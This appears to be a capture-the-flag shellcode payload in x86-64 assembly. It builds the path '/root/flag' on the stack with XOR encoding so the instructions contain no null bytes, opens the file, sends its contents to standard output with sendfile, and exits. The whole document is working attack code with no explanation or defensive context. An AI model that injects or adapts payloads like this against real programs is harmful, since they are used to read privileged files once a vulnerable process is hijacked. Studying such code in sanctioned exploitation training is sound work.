/* open('/root/flag', 0) */
push 0x1016660
xor DWORD PTR [rsp], 0x1010101
mov rax, 0x6c662f746f6f722f
push rax
mov rdi, rsp
xor esi, esi
push 2
pop rax
syscall
/* sendfile(out_fd, in_fd, offset=0, count=0x40) */
push 0x40
pop r10
push 1
pop rdi
xor edx, edx
mov esi, eax
push 0x28
pop rax
syscall
/* exit(0) */
mov rax, 60
mov rdi, 0
syscall